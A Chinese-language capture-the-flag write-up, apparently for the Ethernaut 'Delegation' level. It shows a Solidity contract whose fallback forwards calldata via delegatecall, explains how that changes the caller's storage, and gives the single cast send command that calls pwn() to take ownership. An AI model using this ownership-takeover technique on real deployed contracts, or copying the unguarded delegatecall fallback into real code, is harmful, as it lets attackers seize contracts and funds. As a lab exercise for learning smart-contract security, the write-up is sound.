# Delegation delegatecall

## 源代码

目标:成为Delegation的owner

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

## delegatecall(去翻WTF102笔记)

合约A call 合约B 改变的是合约B的状态变量

合约A delegatecall 合约B 改变的是合约A的状态变量

* calldata :

第一部分 ： 函数的选择器

第二部分 ： 函数的参数数据

## 思路

直接用cast send打，对`delegation合约`发一笔交易,调用一个他没有的`pwn()`函数,这样就会触发`fallback()`

## cast send

```solidity
cast send <实例地址> "pwn()" --rpc-url $SEPOLIA_RPC --private-key $PRIVATE_KEY
```

触发`fallback()`:

```solidity
    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
```

delegatecall`delegate合约`,调用它的pwn(),把我们也就是msg.sender设为owner.(这里这个owner就是delegation合约的owner了)

### msg.data=calldata

pwn()函数的函数选择器在cast send的时候就自动生成了,就是这里

```solidity
cast send <实例地址> "pwn()" ...
```

实际上是向`Delegation`合约发出一个`calldata`:

```solidity
bytes4(keccak256("pwn()")) = 0xdd365b8b
```

但是`Delegation`合约又没有这个函数,匹配不上,所以会进入`fallback()`函数.

而`fallback()`中有delegatecall,我们cast send调用的是`Delegation`合约,但是它把<code><font style="color:#0C68CA;">msg.data</font></code><font style="color:#0C68CA;">(也就是pwn()的函数选择器)</font>交给了`Delegate`合约,进而delegatecall修改owner


> 更新: 2025-07-16 09:27:00  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/exgqh1dygkkhevlm>